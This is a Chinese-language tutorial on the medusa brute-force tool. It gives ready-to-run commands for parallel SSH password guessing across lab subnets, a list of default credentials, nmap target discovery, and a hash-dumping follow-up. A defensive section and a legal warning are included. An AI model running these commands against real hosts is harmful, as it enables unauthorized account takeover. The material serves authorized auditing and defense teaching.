# medusa（并行模块化登录爆破器）

> **一句话**：以线程并行方式对大量主机 / 用户 / 口令组合做在线登录爆破，多目标场景比 hydra 更稳。
> **分类**：口令攻击 ｜ **Kali 包**：`medusa` ｜ **官方文档**：<http://foofus.net/?page_id=51>

## 1. 它解决什么问题

[hydra](hydra.md) 适合「一台机器、试一遍字典」。当你面对的是**一整个网段**——比如内网审计中要检查 200 台设备是否有默认口令——hydra 的多目标模式就显得力不从心。medusa 就是为这个场景设计的：

| 需求 | 首选 |
| --- | --- |
| 单目标、协议多、快速验证 | [hydra](hydra.md) |
| **多目标 × 多用户 × 多口令** 的大规模并行 | **medusa** |
| 语法像 Nmap、要时序模板与断点续跑 | [ncrack](ncrack.md) |
| 要定制 HTTP 请求 / 做非登录类爆破 | [patator](patator.md) |

medusa 的三个设计特点：

1. **线程级并行**：并发粒度同时覆盖「主机」「用户」「口令」三个维度。
2. **模块化**：每个服务是一个独立的 `.mod` 文件，扩展无需改动核心。
3. **组合文件（`-C`）**：支持精确的 `host:user:pass` 三元组，避免无意义的笛卡尔积。

## 2. 工作原理

### 2.1 三层并行

```
-T 控制「同时测多少台主机」
   └── -t 控制「每台主机上同时测多少个登录」
         └── -L 控制「是否一个线程一个用户名」
```

默认行为是「**处理完一个用户名再换下一个**」——即先拿 `user1` 把所有口令试一遍，再换 `user2`。加 `-L` 后改为「一个线程一个用户名」，适合用户数量多、希望用户并行推进的场景。

### 2.2 与 hydra 的机制差异

- hydra 的 `-t` 是「每目标并发连接数」；medusa 把主机并发与登录并发拆成 `-T` 和 `-t` 两层，多目标时可控性更好。
- medusa 有 `-g`（连接超时）、`-r`（重试间隔）、`-R`（重试次数）、`-c`（socket 可用性检测等待）这套健壮性参数，在高延迟/丢包的网络上比 hydra 更少出现「误判失败」。
- medusa 的 `-Z` 可以基于上次扫描的 map 文件**断点续扫**，长时间的大规模任务被打断后不必从头来。

### 2.3 与离线破解的速度差别

medusa 做的是**在线爆破**：每次尝试都要走完整网络往返。局域网内 SSH 大约是**每秒几十到几百次**量级；这比 [hashcat](hashcat.md) 用 GPU 做离线 MD5 的上百亿次/秒相差若干个数量级。因此：

> 在线爆破的价值在于「验证弱口令存在」，而不在于「遍历大字典」。

实践中应优先用**小而精的字典**（默认口令表、常见口令 Top 1000）+ `-e ns`。

### 2.4 支持的模块

`medusa -d` 列出本机可用模块。常见的有 SSH、FTP、Telnet、HTTP(S)、SMB(NT)、MSSQL、MySQL、PostgreSQL、RDP、VNC、POP3、IMAP、SMTP、LDAP、SNMP、SVN、PCAnywhere、rlogin、rexec、Teamspeak、XMPP 等。

## 3. 安装与快速上手

```bash
sudo apt install medusa
medusa -h 2>&1 | head -40
medusa -d          # 列出所有可用模块及用法
```

最短工作流：

```bash
# 单主机 SSH，用户 root，字典爆破，每主机 4 个并发登录
medusa -h 192.168.56.10 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f

# 多主机
medusa -H hosts.txt -U users.txt -P passes.txt -M ssh -T 10 -t 4 -O result.log
```

## 4. 核心参数详解

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-h HOST` | 单个目标主机 | 快速验证时用 |
| `-H FILE` | 目标主机列表文件 | 大规模审计用；一行一个 IP/域名 |
| `-u USER` | 单个用户名 | — |
| `-U FILE` | 用户名列表文件 | 注意与 `-P` 的笛卡尔积规模 |
| `-p PASS` | 单个口令 | 口令喷洒场景 |
| `-P FILE` | 口令字典文件 | 主战场，配 [rockyou](wordlists.md) |
| `-C FILE` | 组合文件 `host:user:pass` | **效率最高**：跳过无效组合。格式见模块 README |
| `-M MODULE` | 模块名（不带 `.mod`） | 必填。`-d` 列出全部 |
| `-m PARAM` | 传给模块的参数，可多次 | HTTP 模块用来指定 URL 路径等；`-q` 查模块用法 |
| `-q` | 显示模块的用法信息 | 用 `-m` 前**必看** |
| `-d` | 列出所有已知模块 | 探索工具的第一站 |
| `-n PORT` | 非默认端口 | 服务跑在非标端口时 |
| `-s` | 启用 SSL | HTTPS/IMAPS 等 |
| `-e ns` | 额外检查：`n`=空口令，`s`=口令等于用户名 | **建议总是加**，成本极低 |
| `-t NUM` | 每主机并发登录数 | 默认值偏保守；本地靶机可到 10~20，远程服务限 4 |
| `-T NUM` | 同时测试的主机数 | 大规模扫描时控制总负载 |
| `-L` | 一个用户名一个线程 | 用户名多、想并行推进时用 |
| `-f` | 单主机命中即停 | 审计常用 |
| `-F` | 任意主机命中即停 | 只想知道「有没有」时快速收敛 |
| `-g NUM` | 连接超时秒数（默认 3） | 高延迟链路调大 |
| `-r NUM` | 重试前休眠秒数（默认 3） | 规避限流 |
| `-R NUM` | 重试次数（实际尝试 = NUM+1） | 丢包网络下减少误判 |
| `-c NUM` | 等待 socket 可用的微秒数（默认 500） | 通常不用改 |
| `-O FILE` | 追加日志到文件 | 审计留档，**强烈建议** |
| `-b` | 抑制启动横幅 | 脚本化时用 |
| `-v NUM` | 详细级别 0–6 | 排错用 3 以上 |
| `-w NUM` | 错误调试级别 0–10 | 定位协议层问题时用 |
| `-Z TEXT` | 基于上次扫描 map 续扫 | 大规模任务被打断后**必用** |
| `-V` | 显示版本 | — |

## 5. 实战演练

**环境声明**：全部在**你自己搭建的隔离靶场**内进行（VirtualBox host-only 网络 + 自建 Kali 与靶机）。**严禁对任何未授权主机执行**。

### 场景 1：单目标 SSH 快速验证

**步骤 1：确认模块可用**

```bash
medusa -d 2>&1 | grep -i -A3 'ssh'
```

**步骤 2：执行**

```bash
printf 'msfadmin\nadmin\nroot\n' > ~/users.txt
printf 'msfadmin\npassword\n123456\n' > ~/pw-small.txt

medusa -h 192.168.56.10 -U ~/users.txt -P ~/pw-small.txt \
       -M ssh -t 4 -e ns -f -O ~/medusa-ssh.log
```

**预期输出片段**

```
Medusa v2.3 [http://www.foofus.net]
ACCOUNT CHECK: [ssh] Host: 192.168.56.10 (1 of 1, 0 complete) User: msfadmin (1 of 3, 0 complete) Password: msfadmin (1 of 3 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.56.10 User: msfadmin Password: msfadmin [SUCCESS]
```

- `ACCOUNT CHECK` 行：显示进度「第几个主机 / 第几个用户 / 第几个口令」。
- `ACCOUNT FOUND … [SUCCESS]`：**命中**。这一行才是结果。

### 场景 2：多主机并行审计（medusa 的主场）

**步骤 1：准备目标清单**

```bash
nmap -sn 192.168.56.0/24 -oG - | awk '/Up$/{print $2}' > ~/live-hosts.txt
wc -l ~/live-hosts.txt
```

**步骤 2：限定协议端口已知的场景**

medusa 不做端口扫描，所以要先用 nmap 确认哪些主机开放 22 端口：

```bash
nmap -p22 --open -oG - 192.168.56.0/24 | awk -F'[ \t]+' '/22\/open/{print $2}' > ~/ssh-hosts.txt
```

**步骤 3：执行（注意 `-T` 与 `-t` 的乘积 = 总并发）**

```bash
medusa -H ~/ssh-hosts.txt -U ~/users.txt -P ~/pw-small.txt \
       -M ssh -T 5 -t 4 -f -O ~/audit.log
```

总并发 = `5 × 4 = 20`。**先算这个数**——若目标是真实设备，20 条并发 SSH 已经足以触发告警。

**步骤 4：断点续扫**

如果中途被打断：

```bash
medusa -H ~/ssh-hosts.txt -U ~/users.txt -P ~/pw-small.txt -M ssh -Z ~/audit.log -O ~/audit2.log
```

### 场景 3：组合文件（跳过无效组合）

当每个主机对应不同的用户名时，笛卡尔积会浪费时间。用 `-C` 精确指定：

```bash
cat > ~/combo.txt <<'EOF'
192.168.56.10:root:toor
192.168.56.10:msfadmin:msfadmin
192.168.56.11:oracle:oracle
192.168.56.11:postgres:postgres
EOF

medusa -C ~/combo.txt -M ssh -t 4 -O ~/combo.log
```

**这是大规模审计中最常用的形式**：把「我们知道的所有 host:user:pass 组合猜测」一次性喂进去，不做任何浪费。

### 场景 4：HTTP 表单（看模块用法）

```bash
# 先看模块怎么用
medusa -M http -q
```

不同版本 medusa 的 HTTP 模块参数不同，**务必以 `-q` 输出的实际参数为准**，不要照搬他人脚本。若表单复杂（含 CSRF token），建议改用 [patator](patator.md)。

## 6. 输出解读

| 输出 | 含义 | 下一步 |
| --- | --- | --- |
| `ACCOUNT CHECK: [ssh] Host: … User: … Password: …` | 正在尝试的组合与进度 | 用进度估算剩余时间 |
| `ACCOUNT FOUND: [ssh] Host: H User: U Password: P [SUCCESS]` | **命中** | 用 `ssh U@H` 验证，然后停止对该目标的爆破 |
| `ACCOUNT FOUND: [ssh] Host: … Password:  [SUCCESS]` | 空口令命中（`-e n`） | 高优先级风险，立即上报 |
| `ERROR: Cannot connect to host` | 连不上 | 检查网络/端口；调大 `-g` |
| `ERROR: Socket … timeout` | 超时 | 调大 `-g`，降 `-t` |
| `ERROR: ssh module … handshake failed` | 协议不匹配（如目标只支持新算法） | 换 [hydra](hydra.md)/[ncrack](ncrack.md) 试试，或确认服务版本 |
| `0 of N accounts found` | 未命中 | 换字典/用户表，或确认服务使用密钥认证 |

**判断成功**：找 `[SUCCESS]` 行，或读 `-O` 指定的日志文件。

## 7. 与其他工具配合

```text
[nmap 存活+端口扫描] → hosts 列表
        ↓
[medusa 多目标爆破] → 弱口令清单
        ↓
[john / hashcat 离线] 登录后 dump 哈希，扩大战果
        ↓
[结果日志] medusa -O 的日志 → 出审计报告
```

- **{nmap, medusa}**：nmap 找门，medusa 试锁。medusa **不扫描端口**，前一步不可省。
- **{medusa, hydra}**：medusa 多目标扫一遍，对报「模块不支持/协议异常」的目标换 hydra 单点重试。
- **{medusa, ncrack}**：要时序模板（`-T0~5`）与更强的断点续跑时换 ncrack。
- **{medusa, wordlists}**：字典来源统一走 [wordlists](wordlists.md) / seclists。

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `ERROR: Cannot connect to host` 全部失败 | 主机不可达、端口错、被 IPS 封 | 先 `nmap -p22` 确认；降 `-t` |
| 明明密码对但报错 | 目标服务要求特定认证方式（键盘交互、MFA） | medusa 模块不支持 → 换 patator 定制，或放弃该服务 |
| `-M ssh` 提示 `Unknown module` | 模块没装或被裁掉 | `medusa -d` 看列表；`apt install medusa` 重装 |
| 结果全部 `[SUCCESS]` 但实际登录失败 | 失败判定被误导（多见于 HTTP 模块） | 换 patator 或用 `-w 6` 观察模块判断逻辑 |
| `-T` 开太大导致丢包 | 并发过度 | `-T`、`-t` 乘积控制在 20 以内 |
| 用户名密码列表是 `.gz` | 未解压 | `gunzip`（见 [wordlists](wordlists.md)） |
| 中文口令失败 | 编码 | `iconv` 转 UTF-8 |
| 跑太久 | 在线爆破的固有速度限制 | 换小字典 + `-e ns`，或接受「未命中」结论 |
| `-C` 组合文件格式错 | 分隔符/字段数不对 | 严格按 `host:user:pass`；用 `-M <mod> -q` 或模块 README 确认 |

## 9. 防御视角（蓝队）

| 风险 | 检测 | 缓解 |
| --- | --- | --- |
| 多主机并行爆破 | 短时间内**同一源 IP 连接到大量主机的同一端口**（横向扇出）——这是 medusa 型扫描的典型特征 | 源 IP 连接数阈值 + 封禁；集中化日志聚合（单机视角看不出来） |
| 单主机多用户爆破 | 单主机登录失败速率突增 | 账户锁定 + 指数退避 |
| 默认口令 | — | 上线前强制改默认口令；设备入网检查 |
| 空口令 / 口令=用户名 | — | 配置基线检查，禁止此两类 |
| 模块不支持 MFA 的服务被爆破 | 成功登录来自非常规地理位置/时间 | **所有远程管理入口强制 MFA**：这是对在线爆破最有效的一招 |

**关键洞察**：medusa 的强项是**横向扇出**，所以蓝队的检测也要**跨主机聚合**——只看单台机器的日志会漏掉。

## 10. 参考

- 官方项目页：<http://foofus.net/?page_id=51>
- Kali 工具页：<https://www.kali.org/tools/medusa/>
- 本机手册：`man medusa`、`medusa -h`、`medusa -d`、`medusa -M <mod> -q`
- 模块目录（安装后）：`/usr/lib/medusa/modules/`
- 相关：[hydra](hydra.md)、[ncrack](ncrack.md)、[patator](patator.md)、[wordlists](wordlists.md)

## ⚠️ 法律与伦理

未经授权对他人主机进行登录口令猜测，可能构成《中华人民共和国刑法》第二百八十五条「非法侵入计算机信息系统罪」或「非法获取计算机信息系统数据罪」；《网络安全法》第二十七条亦明令禁止。批量扫描整个网段的行为性质更严重。

**本教程仅适用于**：你自己拥有的网络与设备、有书面授权的渗透测试与合规审计、CTF 靶场、隔离教学环境。授权范围以书面 ROE 为准，**超出授权范围的主机一个都不能碰**。
